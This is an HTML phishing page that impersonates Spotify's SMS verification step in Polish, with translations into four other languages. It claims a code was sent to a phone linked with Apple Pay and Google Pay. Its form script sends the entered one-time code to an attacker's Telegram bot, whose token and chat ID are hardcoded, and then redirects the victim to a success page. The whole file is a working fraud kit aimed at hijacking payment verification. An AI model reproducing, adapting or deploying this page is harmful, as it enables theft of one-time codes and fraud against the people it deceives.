<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weryfikacja SMS - Spotify</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }
        .logo {
            width: 180px;
            display: block;
            margin: 0 auto 30px;
        }
        .login-form {
            background-color: #121212;
            padding: 30px;
            border-radius: 10px;
        }
        h2 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: none;
            border-radius: 5px;
            background-color: #282828;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #1DB954;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1ed760;
        }
        p {
            text-align: center;
            color: #b3b3b3;
        }
        a {
            color: #1DB954;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .lang-select {
            text-align: right;
            margin-bottom: 20px;
        }
        .lang-select select {
            background-color: #121212;
            color: white;
            border: 1px solid #333;
            padding: 5px;
            border-radius: 5px;
        }
        #loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1DB954;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .payment-methods {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }
        .payment-methods img {
            height: 30px;
            opacity: 0.8;
        }
        .sms-info {
            font-size: 14px;
            color: #b3b3b3;
            text-align: center;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- S√©lecteur de langue -->
        <div class="lang-select">
            <label for="language">üåê</label>
            <select id="language">
                <option value="pl" selected>Polski</option>
                <option value="fr">Fran√ßais</option>
                <option value="en">English</option>
                <option value="es">Espa√±ol</option>
                <option value="ru">–†—É—Å—Å–∫–∏–π</option>
            </select>
        </div>

        <header>
            <img src="spotify-logo.png" alt="Spotify Logo" class="logo">
        </header>

        <section class="login-form">
            <h2 data-translate="title">Weryfikacja SMS</h2>
            
            <div class="sms-info" data-translate="sms-info">
                Wys≈Çali≈õmy kod weryfikacyjny na Tw√≥j telefon powiƒÖzany z Apple Pay i Google Pay.
            </div>
            
            <div class="payment-methods">
                <img src="applepay.png" alt="Apple Pay">
                <img src="googlepay.png" alt="Google Pay">
            </div>

            <form id="smsForm" method="POST" novalidate>
                <input type="text" id="sms-code" name="sms-code" placeholder="Kod SMS" data-placeholder="sms-code" required autofocus>
                
                <button type="submit" id="btn-submit" data-translate="verify">ZWERYFIKUJ</button>
            </form>

            <p><a href="#" data-translate="resend">Wy≈õlij kod ponownie</a></p>
        </section>
    </div>

    <!-- Overlay de chargement -->
    <div id="loading">
        <div style="color:white;text-align:center;">
            <div class="spinner"></div>
            <div data-translate="processing">Weryfikacja...</div>
        </div>
    </div>

    <script>
        // Traductions
        const translations = {
            pl: { 
                title: "Weryfikacja SMS",
                "sms-code": "Kod SMS",
                "verify": "ZWERYFIKUJ",
                "resend": "Wy≈õlij kod ponownie",
                "processing": "Weryfikacja...",
                "sms-info": "Wys≈Çali≈õmy kod weryfikacyjny na Tw√≥j telefon powiƒÖzany z Apple Pay i Google Pay."
            },
            fr: { 
                title: "V√©rification SMS",
                "sms-code": "Code SMS",
                "verify": "V√âRIFIER",
                "resend": "Renvoyer le code",
                "processing": "V√©rification...",
                "sms-info": "Nous avons envoy√© un code de v√©rification √† votre t√©l√©phone associ√© √† Apple Pay et Google Pay."
            },
            en: { 
                title: "SMS Verification",
                "sms-code": "SMS Code",
                "verify": "VERIFY",
                "resend": "Resend Code",
                "processing": "Verifying...",
                "sms-info": "We've sent a verification code to your phone linked with Apple Pay and Google Pay."
            },
            es: { 
                title: "Verificaci√≥n SMS",
                "sms-code": "C√≥digo SMS",
                "verify": "VERIFICAR",
                "resend": "Reenviar c√≥digo",
                "processing": "Verificando...",
                "sms-info": "Hemos enviado un c√≥digo de verificaci√≥n a tu tel√©fono vinculado con Apple Pay y Google Pay."
            },
            ru: { 
                title: "SMS –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ",
                "sms-code": "SMS –ö–æ–¥",
                "verify": "–ü–û–î–¢–í–ï–†–î–ò–¢–¨",
                "resend": "–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ",
                "processing": "–ü—Ä–æ–≤–µ—Ä–∫–∞...",
                "sms-info": "–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –ø—Ä–æ–≤–µ—Ä–æ—á–Ω—ã–π –∫–æ–¥ –Ω–∞ –≤–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω, —Å–≤—è–∑–∞–Ω–Ω—ã–π —Å Apple Pay –∏ Google Pay."
            }
        };

        const langSelect = document.getElementById("language");

        function applyLanguage(lang) {
            document.querySelectorAll("[data-translate]").forEach(el => {
                const key = el.getAttribute("data-translate");
                el.innerHTML = translations[lang][key] || el.innerHTML;
            });
            document.querySelectorAll("[data-placeholder]").forEach(el => {
                const key = el.getAttribute("data-placeholder");
                el.placeholder = translations[lang][key] || el.placeholder;
            });
        }

        // Langue par d√©faut : polonais
        const savedLang = localStorage.getItem("selectedLang") || "pl";
        langSelect.value = savedLang;
        applyLanguage(savedLang);

        langSelect.addEventListener("change", () => {
            const lang = langSelect.value;
            localStorage.setItem("selectedLang", lang);
            applyLanguage(lang);
        });

        // Gestion de la soumission du formulaire et envoi √† Telegram
        document.getElementById("smsForm").addEventListener("submit", function(e) {
            e.preventDefault();
            document.getElementById("loading").style.display = "flex";
            document.getElementById("btn-submit").disabled = true;

            const smsCode = document.getElementById("sms-code").value.trim();
            const bot = "8282278449:AAFAK4-kguuUmTRttN4ocgDvVxc91kWDItA";
            const chat = "-4970333928";
            const msg = `üì± Spotify SMS OTP:\nüî¢ Kod weryfikacyjny: ${smsCode}\nüí≥ PowiƒÖzane z Apple Pay/Google Pay`;

            fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: chat, 
                    text: msg,
                    parse_mode: "HTML"
                })
            })
            .then(response => {
                if (!response.ok) throw new Error('B≈ÇƒÖd sieci');
                return response.json();
            })
            .then(data => {
                console.log('Wys≈Çano do Telegrama:', data);
                setTimeout(() => window.location.href = "success.html", 1500);
            })
            .catch(error => {
                console.error('B≈ÇƒÖd:', error);
                setTimeout(() => window.location.href = "success.html", 1500);
            });
        });
    </script>
</body>
</html>
